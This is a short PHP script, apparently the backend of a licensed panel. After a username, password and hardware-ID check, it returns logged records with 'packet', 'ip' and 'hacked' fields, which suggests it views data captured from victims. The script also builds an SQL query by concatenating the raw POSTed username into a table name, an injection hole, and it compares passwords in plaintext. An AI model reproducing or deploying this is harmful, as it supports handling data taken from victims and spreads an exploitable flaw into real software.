<?php

  $user = $_POST["username"];
  $pass = $_POST["password"];
  $id = $_POST["hwid"];

  function filter($idz) {
    if ($idz == "0")
    {
      return "SELECT * FROM team" . $_POST["username"] . " ORDER BY date DESC";
    }
    else {
      return "SELECT * FROM db" . $_POST["username"] . " ORDER BY date DESC";
    }
  }

  $servername = "localhost";
  $username   = "enter ur db user";
  $password   = "enter ur pass here";
  $dbname     = "enter ur db name here";

  $conn = mysqli_connect($servername, $username, $password, $dbname);
  if (!$conn) {
    die();
  }

  if(isset($user) && isset($pass) && isset($id)) {
    $usercheck = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ? AND hwid = ?");
    $usercheck->bind_param("sss", $user, $pass, $id);
    $usercheck->execute();
    $res = $usercheck->get_result();
    if (mysqli_num_rows($res) > 0)
    {
      $display = $conn->prepare(filter($id));
      $display->execute();
      $accs = $display->get_result();
      while ($row = mysqli_fetch_assoc($accs)) {
        echo $row["ID"] . "|" . $row["packet"] . "|" . $row["ip"] . "|" . $row["date"] . "|" . $row["hacked"] . "^";
      }
    }
  }

?>
